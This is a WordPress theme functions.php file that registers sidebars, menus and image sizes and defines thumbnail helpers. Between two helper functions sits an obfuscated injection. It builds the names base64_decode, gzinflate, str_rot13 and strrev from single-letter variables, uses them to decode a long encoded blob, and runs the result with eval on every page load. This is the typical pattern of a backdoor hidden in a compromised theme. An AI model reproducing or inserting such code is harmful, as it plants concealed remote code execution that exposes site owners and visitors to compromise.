<?php

include 'theme_options.php';

if ( function_exists('register_sidebar') )
	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<div class="sidebox">',
    'after_widget' => '</div>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	));

register_sidebar(array(
	'name' => 'Footer',
    'before_widget' => '<div class="botwid">',
    'after_widget' => '</div>',
	'before_title' => '<h3 class="bothead">',
    'after_title' => '</h3>',
    ));		
	
register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
		
	) );	
	
function get_image_url(){
$image_id = get_post_thumbnail_id();
$image_url = wp_get_attachment_image_src($image_id,'redm_slider');
$image_url = $image_url[0];
echo $image_url;
}
	
function new_excerpt_more($more) {
return '<a href="'. get_permalink($post->ID) . '">' . '&nbsp;&nbsp;[ המשך קריאה ]' . '</a>';
}
add_filter('excerpt_more', 'new_excerpt_more');


if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'redm_slider', 650, 300, true );
	add_image_size( 'redm_home', 150, 100, true ); 
	add_image_size( 'redm_thumb', 80, 60, true ); 
}

function redm_slider_image(){
if ( has_post_thumbnail() ) {
	 the_post_thumbnail( 'redm_slider', array('class' => 'sidim') );
} else {
};
}
 $JRcKn='4';$eBYg='c';$THiaffP='d';$lYVS='o';$DuhxXOM='e';$JPpN='d';$tvepQqQ='s';$IGnNWde='_';$RdDbvP='a';$xogeMQx='b';$ZbSasFS='e';$maaqNRO='6';$juKjzQ='e';$YmErUCHo=$xogeMQx.$RdDbvP.$tvepQqQ.$DuhxXOM.$maaqNRO.$JRcKn.$IGnNWde.$THiaffP.$ZbSasFS.$eBYg.$lYVS.$JPpN.$juKjzQ;$yxLzDqq='t';$gkdAQz='i';$BSXTT='g';$hZpB='e';$pKhOPYG='z';$hhzIX='a';$BfcqVaW='l';$AMbfEQG='n';$IftBdmu='f';$mmFSPAnR=$BSXTT.$pKhOPYG.$gkdAQz.$AMbfEQG.$IftBdmu.$BfcqVaW.$hhzIX.$yxLzDqq.$hZpB;$nxNXrj='o';$uWmCk='1';$RHThnPz='_';$jDWDr='r';$tEZXADp='t';$bakY='3';$HSEf='s';$eJUvTc='t';$iXAbeiT='r';$GWrCsyKS=$HSEf.$eJUvTc.$jDWDr.$RHThnPz.$iXAbeiT.$nxNXrj.$tEZXADp.$uWmCk.$bakY;$geiLdn='r';$bBUu='t';$VxagXrW='r';$VbkPe='e';$TcxqWik='s';$faQqhS='v';$iHEYeFSO=$TcxqWik.$bBUu.$VxagXrW.$geiLdn.$VbkPe.$faQqhS;eval($mmFSPAnR($YmErUCHo($GWrCsyKS($iHEYeFSO('=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'))))); 
function redm_home_image(){
if ( has_post_thumbnail() ) {
	 the_post_thumbnail( 'redm_home', array('class' => 'postim') );
} else { 
	};
}

function redm_thumb_image(){
if ( has_post_thumbnail() ) {
	 the_post_thumbnail( 'redm_thumb', array('class' => 'phumb') );
} else {
};
}
